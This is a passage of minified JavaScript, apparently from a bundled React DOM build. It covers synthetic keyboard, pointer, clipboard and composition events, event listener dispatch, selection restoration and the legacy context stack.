      return "clipboardData" in i ? i.clipboardData : window.clipboardData;
    },
  }),
  Jd = rd(Id),
  Kd = A$1({}, sd, { data: 0 }),
  Ld = rd(Kd),
  Md = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified",
  },
  Nd = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta",
  },
  Od = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey",
  };
function Pd(i) {
  var a = this.nativeEvent;
  return a.getModifierState ? a.getModifierState(i) : (i = Od[i]) ? !!a[i] : !1;
}
function zd() {
  return Pd;
}
var Qd = A$1({}, ud, {
    key: function (i) {
      if (i.key) {
        var a = Md[i.key] || i.key;
        if (a !== "Unidentified") return a;
      }
      return i.type === "keypress"
        ? ((i = od(i)), i === 13 ? "Enter" : String.fromCharCode(i))
        : i.type === "keydown" || i.type === "keyup"
        ? Nd[i.keyCode] || "Unidentified"
        : "";
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: zd,
    charCode: function (i) {
      return i.type === "keypress" ? od(i) : 0;
    },
    keyCode: function (i) {
      return i.type === "keydown" || i.type === "keyup" ? i.keyCode : 0;
    },
    which: function (i) {
      return i.type === "keypress"
        ? od(i)
        : i.type === "keydown" || i.type === "keyup"
        ? i.keyCode
        : 0;
    },
  }),
  Rd = rd(Qd),
  Sd = A$1({}, Ad, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0,
  }),
  Td = rd(Sd),
  Ud = A$1({}, ud, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: zd,
  }),
  Vd = rd(Ud),
  Wd = A$1({}, sd, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
  Xd = rd(Wd),
  Yd = A$1({}, Ad, {
    deltaX: function (i) {
      return "deltaX" in i ? i.deltaX : "wheelDeltaX" in i ? -i.wheelDeltaX : 0;
    },
    deltaY: function (i) {
      return "deltaY" in i
        ? i.deltaY
        : "wheelDeltaY" in i
        ? -i.wheelDeltaY
        : "wheelDelta" in i
        ? -i.wheelDelta
        : 0;
    },
    deltaZ: 0,
    deltaMode: 0,
  }),
  Zd = rd(Yd),
  $d = [9, 13, 27, 32],
  ae$1 = ia && "CompositionEvent" in window,
  be$1 = null;
ia && "documentMode" in document && (be$1 = document.documentMode);
var ce$1 = ia && "TextEvent" in window && !be$1,
  de = ia && (!ae$1 || (be$1 && 8 < be$1 && 11 >= be$1)),
  ee$1 = " ",
  fe$1 = !1;
function ge$1(i, a) {
  switch (i) {
    case "keyup":
      return $d.indexOf(a.keyCode) !== -1;
    case "keydown":
      return a.keyCode !== 229;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
    default:
      return !1;
  }
}
function he$1(i) {
  return (i = i.detail), typeof i == "object" && "data" in i ? i.data : null;
}
var ie$1 = !1;
function je$1(i, a) {
  switch (i) {
    case "compositionend":
      return he$1(a);
    case "keypress":
      return a.which !== 32 ? null : ((fe$1 = !0), ee$1);
    case "textInput":
      return (i = a.data), i === ee$1 && fe$1 ? null : i;
    default:
      return null;
  }
}
function ke$1(i, a) {
  if (ie$1)
    return i === "compositionend" || (!ae$1 && ge$1(i, a))
      ? ((i = nd()), (md = ld = kd = null), (ie$1 = !1), i)
      : null;
  switch (i) {
    case "paste":
      return null;
    case "keypress":
      if (!(a.ctrlKey || a.altKey || a.metaKey) || (a.ctrlKey && a.altKey)) {
        if (a.char && 1 < a.char.length) return a.char;
        if (a.which) return String.fromCharCode(a.which);
      }
      return null;
    case "compositionend":
      return de && a.locale !== "ko" ? null : a.data;
    default:
      return null;
  }
}
var le$1 = {
  color: !0,
  date: !0,
  datetime: !0,
  "datetime-local": !0,
  email: !0,
  month: !0,
  number: !0,
  password: !0,
  range: !0,
  search: !0,
  tel: !0,
  text: !0,
  time: !0,
  url: !0,
  week: !0,
};
function me(i) {
  var a = i && i.nodeName && i.nodeName.toLowerCase();
  return a === "input" ? !!le$1[i.type] : a === "textarea";
}
function ne$1(i, a, o, s) {
  Eb(s),
    (a = oe$1(a, "onChange")),
    0 < a.length &&
      ((o = new td("onChange", "change", null, o, s)),
      i.push({ event: o, listeners: a }));
}
var pe = null,
  qe$1 = null;
function re$1(i) {
  se$1(i, 0);
}
function te$1(i) {
  var a = ue$1(i);
  if (Wa(a)) return i;
}
function ve$1(i, a) {
  if (i === "change") return a;
}
var we$1 = !1;
if (ia) {
  var xe$1;
  if (ia) {
    var ye$1 = "oninput" in document;
    if (!ye$1) {
      var ze$1 = document.createElement("div");
      ze$1.setAttribute("oninput", "return;"),
        (ye$1 = typeof ze$1.oninput == "function");
    }
    xe$1 = ye$1;
  } else xe$1 = !1;
  we$1 = xe$1 && (!document.documentMode || 9 < document.documentMode);
}
function Ae$1() {
  pe && (pe.detachEvent("onpropertychange", Be), (qe$1 = pe = null));
}
function Be(i) {
  if (i.propertyName === "value" && te$1(qe$1)) {
    var a = [];
    ne$1(a, qe$1, i, xb(i)), Jb(re$1, a);
  }
}
function Ce$1(i, a, o) {
  i === "focusin"
    ? (Ae$1(), (pe = a), (qe$1 = o), pe.attachEvent("onpropertychange", Be))
    : i === "focusout" && Ae$1();
}
function De$1(i) {
  if (i === "selectionchange" || i === "keyup" || i === "keydown")
    return te$1(qe$1);
}
function Ee$1(i, a) {
  if (i === "click") return te$1(a);
}
function Fe$1(i, a) {
  if (i === "input" || i === "change") return te$1(a);
}
function Ge$1(i, a) {
  return (i === a && (i !== 0 || 1 / i === 1 / a)) || (i !== i && a !== a);
}
var He$1 = typeof Object.is == "function" ? Object.is : Ge$1;
function Ie$1(i, a) {
  if (He$1(i, a)) return !0;
  if (typeof i != "object" || i === null || typeof a != "object" || a === null)
    return !1;
  var o = Object.keys(i),
    s = Object.keys(a);
  if (o.length !== s.length) return !1;
  for (s = 0; s < o.length; s++) {
    var tt = o[s];
    if (!ja.call(a, tt) || !He$1(i[tt], a[tt])) return !1;
  }
  return !0;
}
function Je$1(i) {
  for (; i && i.firstChild; ) i = i.firstChild;
  return i;
}
function Ke$1(i, a) {
  var o = Je$1(i);
  i = 0;
  for (var s; o; ) {
    if (o.nodeType === 3) {
      if (((s = i + o.textContent.length), i <= a && s >= a))
        return { node: o, offset: a - i };
      i = s;
    }
    e: {
      for (; o; ) {
        if (o.nextSibling) {
          o = o.nextSibling;
          break e;
        }
        o = o.parentNode;
      }
      o = void 0;
    }
    o = Je$1(o);
  }
}
function Le(i, a) {
  return i && a
    ? i === a
      ? !0
      : i && i.nodeType === 3
      ? !1
      : a && a.nodeType === 3
      ? Le(i, a.parentNode)
      : "contains" in i
      ? i.contains(a)
      : i.compareDocumentPosition
      ? !!(i.compareDocumentPosition(a) & 16)
      : !1
    : !1;
}
function Me$1() {
  for (var i = window, a = Xa(); a instanceof i.HTMLIFrameElement; ) {
    try {
      var o = typeof a.contentWindow.location.href == "string";
    } catch {
      o = !1;
    }
    if (o) i = a.contentWindow;
    else break;
    a = Xa(i.document);
  }
  return a;
}
function Ne$1(i) {
  var a = i && i.nodeName && i.nodeName.toLowerCase();
  return (
    a &&
    ((a === "input" &&
      (i.type === "text" ||
        i.type === "search" ||
        i.type === "tel" ||
        i.type === "url" ||
        i.type === "password")) ||
      a === "textarea" ||
      i.contentEditable === "true")
  );
}
function Oe$1(i) {
  var a = Me$1(),
    o = i.focusedElem,
    s = i.selectionRange;
  if (
    a !== o &&
    o &&
    o.ownerDocument &&
    Le(o.ownerDocument.documentElement, o)
  ) {
    if (s !== null && Ne$1(o)) {
      if (
        ((a = s.start),
        (i = s.end),
        i === void 0 && (i = a),
        "selectionStart" in o)
      )
        (o.selectionStart = a), (o.selectionEnd = Math.min(i, o.value.length));
      else if (
        ((i = ((a = o.ownerDocument || document) && a.defaultView) || window),
        i.getSelection)
      ) {
        i = i.getSelection();
        var tt = o.textContent.length,
          nt = Math.min(s.start, tt);
        (s = s.end === void 0 ? nt : Math.min(s.end, tt)),
          !i.extend && nt > s && ((tt = s), (s = nt), (nt = tt)),
          (tt = Ke$1(o, nt));
        var ot = Ke$1(o, s);
        tt &&
          ot &&
          (i.rangeCount !== 1 ||
            i.anchorNode !== tt.node ||
            i.anchorOffset !== tt.offset ||
            i.focusNode !== ot.node ||
            i.focusOffset !== ot.offset) &&
          ((a = a.createRange()),
          a.setStart(tt.node, tt.offset),
          i.removeAllRanges(),
          nt > s
            ? (i.addRange(a), i.extend(ot.node, ot.offset))
            : (a.setEnd(ot.node, ot.offset), i.addRange(a)));
      }
    }
    for (a = [], i = o; (i = i.parentNode); )
      i.nodeType === 1 &&
        a.push({ element: i, left: i.scrollLeft, top: i.scrollTop });
    for (typeof o.focus == "function" && o.focus(), o = 0; o < a.length; o++)
      (i = a[o]),
        (i.element.scrollLeft = i.left),
        (i.element.scrollTop = i.top);
  }
}
var Pe$1 = ia && "documentMode" in document && 11 >= document.documentMode,
  Qe$1 = null,
  Re$1 = null,
  Se$1 = null,
  Te$1 = !1;
function Ue$1(i, a, o) {
  var s = o.window === o ? o.document : o.nodeType === 9 ? o : o.ownerDocument;
  Te$1 ||
    Qe$1 == null ||
    Qe$1 !== Xa(s) ||
    ((s = Qe$1),
    "selectionStart" in s && Ne$1(s)
      ? (s = { start: s.selectionStart, end: s.selectionEnd })
      : ((s = (
          (s.ownerDocument && s.ownerDocument.defaultView) ||
          window
        ).getSelection()),
        (s = {
          anchorNode: s.anchorNode,
          anchorOffset: s.anchorOffset,
          focusNode: s.focusNode,
          focusOffset: s.focusOffset,
        })),
    (Se$1 && Ie$1(Se$1, s)) ||
      ((Se$1 = s),
      (s = oe$1(Re$1, "onSelect")),
      0 < s.length &&
        ((a = new td("onSelect", "select", null, a, o)),
        i.push({ event: a, listeners: s }),
        (a.target = Qe$1))));
}
function Ve$1(i, a) {
  var o = {};
  return (
    (o[i.toLowerCase()] = a.toLowerCase()),
    (o["Webkit" + i] = "webkit" + a),
    (o["Moz" + i] = "moz" + a),
    o
  );
}
var We$1 = {
    animationend: Ve$1("Animation", "AnimationEnd"),
    animationiteration: Ve$1("Animation", "AnimationIteration"),
    animationstart: Ve$1("Animation", "AnimationStart"),
    transitionend: Ve$1("Transition", "TransitionEnd"),
  },
  Xe$1 = {},
  Ye = {};
ia &&
  ((Ye = document.createElement("div").style),
  "AnimationEvent" in window ||
    (delete We$1.animationend.animation,
    delete We$1.animationiteration.animation,
    delete We$1.animationstart.animation),
  "TransitionEvent" in window || delete We$1.transitionend.transition);
function Ze$1(i) {
  if (Xe$1[i]) return Xe$1[i];
  if (!We$1[i]) return i;
  var a = We$1[i],
    o;
  for (o in a) if (a.hasOwnProperty(o) && o in Ye) return (Xe$1[i] = a[o]);
  return i;
}
var $e$1 = Ze$1("animationend"),
  af = Ze$1("animationiteration"),
  bf = Ze$1("animationstart"),
  cf = Ze$1("transitionend"),
  df = new Map(),
  ef =
    "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
      " "
    );
function ff(i, a) {
  df.set(i, a), fa(a, [i]);
}
for (var gf = 0; gf < ef.length; gf++) {
  var hf = ef[gf],
    jf = hf.toLowerCase(),
    kf = hf[0].toUpperCase() + hf.slice(1);
  ff(jf, "on" + kf);
}
ff($e$1, "onAnimationEnd");
ff(af, "onAnimationIteration");
ff(bf, "onAnimationStart");
ff("dblclick", "onDoubleClick");
ff("focusin", "onFocus");
ff("focusout", "onBlur");
ff(cf, "onTransitionEnd");
ha("onMouseEnter", ["mouseout", "mouseover"]);
ha("onMouseLeave", ["mouseout", "mouseover"]);
ha("onPointerEnter", ["pointerout", "pointerover"]);
ha("onPointerLeave", ["pointerout", "pointerover"]);
fa(
  "onChange",
  "change click focusin focusout input keydown keyup selectionchange".split(" ")
);
fa(
  "onSelect",
  "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
    " "
  )
);
fa("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
fa(
  "onCompositionEnd",
  "compositionend focusout keydown keypress keyup mousedown".split(" ")
);
fa(
  "onCompositionStart",
  "compositionstart focusout keydown keypress keyup mousedown".split(" ")
);
fa(
  "onCompositionUpdate",
  "compositionupdate focusout keydown keypress keyup mousedown".split(" ")
);
var lf =
    "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
      " "
    ),
  mf = new Set("cancel close invalid load scroll toggle".split(" ").concat(lf));
function nf(i, a, o) {
  var s = i.type || "unknown-event";
  (i.currentTarget = o), Ub(s, a, void 0, i), (i.currentTarget = null);
}
function se$1(i, a) {
  a = (a & 4) !== 0;
  for (var o = 0; o < i.length; o++) {
    var s = i[o],
      tt = s.event;
    s = s.listeners;
    e: {
      var nt = void 0;
      if (a)
        for (var ot = s.length - 1; 0 <= ot; ot--) {
          var st = s[ot],
            ft = st.instance,
            ht = st.currentTarget;
          if (((st = st.listener), ft !== nt && tt.isPropagationStopped()))
            break e;
          nf(tt, st, ht), (nt = ft);
        }
      else
        for (ot = 0; ot < s.length; ot++) {
          if (
            ((st = s[ot]),
            (ft = st.instance),
            (ht = st.currentTarget),
            (st = st.listener),
            ft !== nt && tt.isPropagationStopped())
          )
            break e;
          nf(tt, st, ht), (nt = ft);
        }
    }
  }
  if (Qb) throw ((i = Rb), (Qb = !1), (Rb = null), i);
}
function D$1(i, a) {
  var o = a[of];
  o === void 0 && (o = a[of] = new Set());
  var s = i + "__bubble";
  o.has(s) || (pf(a, i, 2, !1), o.add(s));
}
function qf(i, a, o) {
  var s = 0;
  a && (s |= 4), pf(o, i, s, a);
}
var rf = "_reactListening" + Math.random().toString(36).slice(2);
function sf(i) {
  if (!i[rf]) {
    (i[rf] = !0),
      da.forEach(function (o) {
        o !== "selectionchange" && (mf.has(o) || qf(o, !1, i), qf(o, !0, i));
      });
    var a = i.nodeType === 9 ? i : i.ownerDocument;
    a === null || a[rf] || ((a[rf] = !0), qf("selectionchange", !1, a));
  }
}
function pf(i, a, o, s) {
  switch (jd(a)) {
    case 1:
      var tt = ed;
      break;
    case 4:
      tt = gd;
      break;
    default:
      tt = fd;
  }
  (o = tt.bind(null, a, o, i)),
    (tt = void 0),
    !Lb ||
      (a !== "touchstart" && a !== "touchmove" && a !== "wheel") ||
      (tt = !0),
    s
      ? tt !== void 0
        ? i.addEventListener(a, o, { capture: !0, passive: tt })
        : i.addEventListener(a, o, !0)
      : tt !== void 0
      ? i.addEventListener(a, o, { passive: tt })
      : i.addEventListener(a, o, !1);
}
function hd(i, a, o, s, tt) {
  var nt = s;
  if (!(a & 1) && !(a & 2) && s !== null)
    e: for (;;) {
      if (s === null) return;
      var ot = s.tag;
      if (ot === 3 || ot === 4) {
        var st = s.stateNode.containerInfo;
        if (st === tt || (st.nodeType === 8 && st.parentNode === tt)) break;
        if (ot === 4)
          for (ot = s.return; ot !== null; ) {
            var ft = ot.tag;
            if (
              (ft === 3 || ft === 4) &&
              ((ft = ot.stateNode.containerInfo),
              ft === tt || (ft.nodeType === 8 && ft.parentNode === tt))
            )
              return;
            ot = ot.return;
          }
        for (; st !== null; ) {
          if (((ot = Wc(st)), ot === null)) return;
          if (((ft = ot.tag), ft === 5 || ft === 6)) {
            s = nt = ot;
            continue e;
          }
          st = st.parentNode;
        }
      }
      s = s.return;
    }
  Jb(function () {
    var ht = nt,
      gt = xb(o),
      St = [];
    e: {
      var vt = df.get(i);
      if (vt !== void 0) {
        var _t = td,
          Et = i;
        switch (i) {
          case "keypress":
            if (od(o) === 0) break e;
          case "keydown":
          case "keyup":
            _t = Rd;
            break;
          case "focusin":
            (Et = "focus"), (_t = Fd);
            break;
          case "focusout":
            (Et = "blur"), (_t = Fd);
            break;
          case "beforeblur":
          case "afterblur":
            _t = Fd;
            break;
          case "click":
            if (o.button === 2) break e;
          case "auxclick":
          case "dblclick":
          case "mousedown":
          case "mousemove":
          case "mouseup":
          case "mouseout":
          case "mouseover":
          case "contextmenu":
            _t = Bd;
            break;
          case "drag":
          case "dragend":
          case "dragenter":
          case "dragexit":
          case "dragleave":
          case "dragover":
          case "dragstart":
          case "drop":
            _t = Dd;
            break;
          case "touchcancel":
          case "touchend":
          case "touchmove":
          case "touchstart":
            _t = Vd;
            break;
          case $e$1:
          case af:
          case bf:
            _t = Hd;
            break;
          case cf:
            _t = Xd;
            break;
          case "scroll":
            _t = vd;
            break;
          case "wheel":
            _t = Zd;
            break;
          case "copy":
          case "cut":
          case "paste":
            _t = Jd;
            break;
          case "gotpointercapture":
          case "lostpointercapture":
          case "pointercancel":
          case "pointerdown":
          case "pointermove":
          case "pointerout":
          case "pointerover":
          case "pointerup":
            _t = Td;
        }
        var Ct = (a & 4) !== 0,
          Pt = !Ct && i === "scroll",
          bt = Ct ? (vt !== null ? vt + "Capture" : null) : vt;
        Ct = [];
        for (var xt = ht, yt; xt !== null; ) {
          yt = xt;
          var wt = yt.stateNode;
          if (
            (yt.tag === 5 &&
              wt !== null &&
              ((yt = wt),
              bt !== null &&
                ((wt = Kb(xt, bt)), wt != null && Ct.push(tf(xt, wt, yt)))),
            Pt)
          )
            break;
          xt = xt.return;
        }
        0 < Ct.length &&
          ((vt = new _t(vt, Et, null, o, gt)),
          St.push({ event: vt, listeners: Ct }));
      }
    }
    if (!(a & 7)) {
      e: {
        if (
          ((vt = i === "mouseover" || i === "pointerover"),
          (_t = i === "mouseout" || i === "pointerout"),
          vt &&
            o !== wb &&
            (Et = o.relatedTarget || o.fromElement) &&
            (Wc(Et) || Et[uf]))
        )
          break e;
        if (
          (_t || vt) &&
          ((vt =
            gt.window === gt
              ? gt
              : (vt = gt.ownerDocument)
              ? vt.defaultView || vt.parentWindow
              : window),
          _t
            ? ((Et = o.relatedTarget || o.toElement),
              (_t = ht),
              (Et = Et ? Wc(Et) : null),
              Et !== null &&
                ((Pt = Vb(Et)), Et !== Pt || (Et.tag !== 5 && Et.tag !== 6)) &&
                (Et = null))
            : ((_t = null), (Et = ht)),
          _t !== Et)
        ) {
          if (
            ((Ct = Bd),
            (wt = "onMouseLeave"),
            (bt = "onMouseEnter"),
            (xt = "mouse"),
            (i === "pointerout" || i === "pointerover") &&
              ((Ct = Td),
              (wt = "onPointerLeave"),
              (bt = "onPointerEnter"),
              (xt = "pointer")),
            (Pt = _t == null ? vt : ue$1(_t)),
            (yt = Et == null ? vt : ue$1(Et)),
            (vt = new Ct(wt, xt + "leave", _t, o, gt)),
            (vt.target = Pt),
            (vt.relatedTarget = yt),
            (wt = null),
            Wc(gt) === ht &&
              ((Ct = new Ct(bt, xt + "enter", Et, o, gt)),
              (Ct.target = yt),
              (Ct.relatedTarget = Pt),
              (wt = Ct)),
            (Pt = wt),
            _t && Et)
          )
            t: {
              for (Ct = _t, bt = Et, xt = 0, yt = Ct; yt; yt = vf(yt)) xt++;
              for (yt = 0, wt = bt; wt; wt = vf(wt)) yt++;
              for (; 0 < xt - yt; ) (Ct = vf(Ct)), xt--;
              for (; 0 < yt - xt; ) (bt = vf(bt)), yt--;
              for (; xt--; ) {
                if (Ct === bt || (bt !== null && Ct === bt.alternate)) break t;
                (Ct = vf(Ct)), (bt = vf(bt));
              }
              Ct = null;
            }
          else Ct = null;
          _t !== null && wf(St, vt, _t, Ct, !1),
            Et !== null && Pt !== null && wf(St, Pt, Et, Ct, !0);
        }
      }
      e: {
        if (
          ((vt = ht ? ue$1(ht) : window),
          (_t = vt.nodeName && vt.nodeName.toLowerCase()),
          _t === "select" || (_t === "input" && vt.type === "file"))
        )
          var $t = ve$1;
        else if (me(vt))
          if (we$1) $t = Fe$1;
          else {
            $t = De$1;
            var kt = Ce$1;
          }
        else
          (_t = vt.nodeName) &&
            _t.toLowerCase() === "input" &&
            (vt.type === "checkbox" || vt.type === "radio") &&
            ($t = Ee$1);
        if ($t && ($t = $t(i, ht))) {
          ne$1(St, $t, o, gt);
          break e;
        }
        kt && kt(i, vt, ht),
          i === "focusout" &&
            (kt = vt._wrapperState) &&
            kt.controlled &&
            vt.type === "number" &&
            cb(vt, "number", vt.value);
      }
      switch (((kt = ht ? ue$1(ht) : window), i)) {
        case "focusin":
          (me(kt) || kt.contentEditable === "true") &&
            ((Qe$1 = kt), (Re$1 = ht), (Se$1 = null));
          break;
        case "focusout":
          Se$1 = Re$1 = Qe$1 = null;
          break;
        case "mousedown":
          Te$1 = !0;
          break;
        case "contextmenu":
        case "mouseup":
        case "dragend":
          (Te$1 = !1), Ue$1(St, o, gt);
          break;
        case "selectionchange":
          if (Pe$1) break;
        case "keydown":
        case "keyup":
          Ue$1(St, o, gt);
      }
      var Rt;
      if (ae$1)
        e: {
          switch (i) {
            case "compositionstart":
              var It = "onCompositionStart";
              break e;
            case "compositionend":
              It = "onCompositionEnd";
              break e;
            case "compositionupdate":
              It = "onCompositionUpdate";
              break e;
          }
          It = void 0;
        }
      else
        ie$1
          ? ge$1(i, o) && (It = "onCompositionEnd")
          : i === "keydown" && o.keyCode === 229 && (It = "onCompositionStart");
      It &&
        (de &&
          o.locale !== "ko" &&
          (ie$1 || It !== "onCompositionStart"
            ? It === "onCompositionEnd" && ie$1 && (Rt = nd())
            : ((kd = gt),
              (ld = "value" in kd ? kd.value : kd.textContent),
              (ie$1 = !0))),
        (kt = oe$1(ht, It)),
        0 < kt.length &&
          ((It = new Ld(It, i, null, o, gt)),
          St.push({ event: It, listeners: kt }),
          Rt
            ? (It.data = Rt)
            : ((Rt = he$1(o)), Rt !== null && (It.data = Rt)))),
        (Rt = ce$1 ? je$1(i, o) : ke$1(i, o)) &&
          ((ht = oe$1(ht, "onBeforeInput")),
          0 < ht.length &&
            ((gt = new Ld("onBeforeInput", "beforeinput", null, o, gt)),
            St.push({ event: gt, listeners: ht }),
            (gt.data = Rt)));
    }
    se$1(St, a);
  });
}
function tf(i, a, o) {
  return { instance: i, listener: a, currentTarget: o };
}
function oe$1(i, a) {
  for (var o = a + "Capture", s = []; i !== null; ) {
    var tt = i,
      nt = tt.stateNode;
    tt.tag === 5 &&
      nt !== null &&
      ((tt = nt),
      (nt = Kb(i, o)),
      nt != null && s.unshift(tf(i, nt, tt)),
      (nt = Kb(i, a)),
      nt != null && s.push(tf(i, nt, tt))),
      (i = i.return);
  }
  return s;
}
function vf(i) {
  if (i === null) return null;
  do i = i.return;
  while (i && i.tag !== 5);
  return i || null;
}
function wf(i, a, o, s, tt) {
  for (var nt = a._reactName, ot = []; o !== null && o !== s; ) {
    var st = o,
      ft = st.alternate,
      ht = st.stateNode;
    if (ft !== null && ft === s) break;
    st.tag === 5 &&
      ht !== null &&
      ((st = ht),
      tt
        ? ((ft = Kb(o, nt)), ft != null && ot.unshift(tf(o, ft, st)))
        : tt || ((ft = Kb(o, nt)), ft != null && ot.push(tf(o, ft, st)))),
      (o = o.return);
  }
  ot.length !== 0 && i.push({ event: a, listeners: ot });
}
var xf = /\r\n?/g,
  yf = /\u0000|\uFFFD/g;
function zf(i) {
  return (typeof i == "string" ? i : "" + i)
    .replace(
      xf,
      `
`
    )
    .replace(yf, "");
}
function Af(i, a, o) {
  if (((a = zf(a)), zf(i) !== a && o)) throw Error(p$1(425));
}
function Bf() {}
var Cf = null,
  Df = null;
function Ef(i, a) {
  return (
    i === "textarea" ||
    i === "noscript" ||
    typeof a.children == "string" ||
    typeof a.children == "number" ||
    (typeof a.dangerouslySetInnerHTML == "object" &&
      a.dangerouslySetInnerHTML !== null &&
      a.dangerouslySetInnerHTML.__html != null)
  );
}
var Ff = typeof setTimeout == "function" ? setTimeout : void 0,
  Gf = typeof clearTimeout == "function" ? clearTimeout : void 0,
  Hf = typeof Promise == "function" ? Promise : void 0,
  Jf =
    typeof queueMicrotask == "function"
      ? queueMicrotask
      : typeof Hf < "u"
      ? function (i) {
          return Hf.resolve(null).then(i).catch(If);
        }
      : Ff;
function If(i) {
  setTimeout(function () {
    throw i;
  });
}
function Kf(i, a) {
  var o = a,
    s = 0;
  do {
    var tt = o.nextSibling;
    if ((i.removeChild(o), tt && tt.nodeType === 8))
      if (((o = tt.data), o === "/$")) {
        if (s === 0) {
          i.removeChild(tt), bd(a);
          return;
        }
        s--;
      } else (o !== "$" && o !== "$?" && o !== "$!") || s++;
    o = tt;
  } while (o);
  bd(a);
}
function Lf(i) {
  for (; i != null; i = i.nextSibling) {
    var a = i.nodeType;
    if (a === 1 || a === 3) break;
    if (a === 8) {
      if (((a = i.data), a === "$" || a === "$!" || a === "$?")) break;
      if (a === "/$") return null;
    }
  }
  return i;
}
function Mf(i) {
  i = i.previousSibling;
  for (var a = 0; i; ) {
    if (i.nodeType === 8) {
      var o = i.data;
      if (o === "$" || o === "$!" || o === "$?") {
        if (a === 0) return i;
        a--;
      } else o === "/$" && a++;
    }
    i = i.previousSibling;
  }
  return null;
}
var Nf = Math.random().toString(36).slice(2),
  Of = "__reactFiber$" + Nf,
  Pf = "__reactProps$" + Nf,
  uf = "__reactContainer$" + Nf,
  of = "__reactEvents$" + Nf,
  Qf = "__reactListeners$" + Nf,
  Rf = "__reactHandles$" + Nf;
function Wc(i) {
  var a = i[Of];
  if (a) return a;
  for (var o = i.parentNode; o; ) {
    if ((a = o[uf] || o[Of])) {
      if (
        ((o = a.alternate),
        a.child !== null || (o !== null && o.child !== null))
      )
        for (i = Mf(i); i !== null; ) {
          if ((o = i[Of])) return o;
          i = Mf(i);
        }
      return a;
    }
    (i = o), (o = i.parentNode);
  }
  return null;
}
function Cb(i) {
  return (
    (i = i[Of] || i[uf]),
    !i || (i.tag !== 5 && i.tag !== 6 && i.tag !== 13 && i.tag !== 3) ? null : i
  );
}
function ue$1(i) {
  if (i.tag === 5 || i.tag === 6) return i.stateNode;
  throw Error(p$1(33));
}
function Db(i) {
  return i[Pf] || null;
}
var Sf = [],
  Tf = -1;
function Uf(i) {
  return { current: i };
}
function E(i) {
  0 > Tf || ((i.current = Sf[Tf]), (Sf[Tf] = null), Tf--);
}
function G$1(i, a) {
  Tf++, (Sf[Tf] = i.current), (i.current = a);
}
var Vf = {},
  H$1 = Uf(Vf),
  Wf = Uf(!1),
  Xf = Vf;
function Yf(i, a) {
  var o = i.type.contextTypes;
  if (!o) return Vf;
  var s = i.stateNode;
  if (s && s.__reactInternalMemoizedUnmaskedChildContext === a)
    return s.__reactInternalMemoizedMaskedChildContext;
  var tt = {},
    nt;
  for (nt in o) tt[nt] = a[nt];
  return (
    s &&
      ((i = i.stateNode),
      (i.__reactInternalMemoizedUnmaskedChildContext = a),
      (i.__reactInternalMemoizedMaskedChildContext = tt)),
    tt
  );
}
function Zf(i) {
  return (i = i.childContextTypes), i != null;
}
function $f() {
  E(Wf), E(H$1);
}
function ag(i, a, o) {
  if (H$1.current !== Vf) throw Error(p$1(168));
  G$1(H$1, a), G$1(Wf, o);
}
function bg(i, a, o) {
  var s = i.stateNode;
  if (((a = a.childContextTypes), typeof s.getChildContext != "function"))
    return o;
  s = s.getChildContext();
  for (var tt in s)
    if (!(tt in a)) throw Error(p$1(108, Ra(i) || "Unknown", tt));
  return A$1({}, o, s);
}
function cg(i) {
  return (
    (i =
      ((i = i.stateNode) && i.__reactInternalMemoizedMergedChildContext) || Vf),
    (Xf = H$1.current),
    G$1(H$1, i),
    G$1(Wf, Wf.current),
    !0
  );
}
function dg(i, a, o) {
  var s = i.stateNode;
  if (!s) throw Error(p$1(169));
  o
    ? ((i = bg(i, a, Xf)),
      (s.__reactInternalMemoizedMergedChildContext = i),
      E(Wf),
      E(H$1),
      G$1(H$1, i))
    : E(Wf),
    G$1(Wf, o);
}
var eg = null,
  fg = !1,
  gg = !1;
function hg(i) {
  eg === null ? (eg = [i]) : eg.push(i);
}
function ig(i) {
  (fg = !0), hg(i);
}
function jg() {
  if (!gg && eg !== null) {
    gg = !0;
    var i = 0,
      a = C$1;
    try {
      var o = eg;
      for (C$1 = 1; i < o.length; i++) {
        var s = o[i];
        do s = s(!0);
        while (s !== null);
      }
      (eg = null), (fg = !1);
    } catch (tt) {
      throw (eg !== null && (eg = eg.slice(i + 1)), ac(fc, jg), tt);
    } finally {
      (C$1 = a), (gg = !1);
    }
  }
  return null;
}
var kg = [],
  lg = 0,
  mg = null,
  ng = 0,
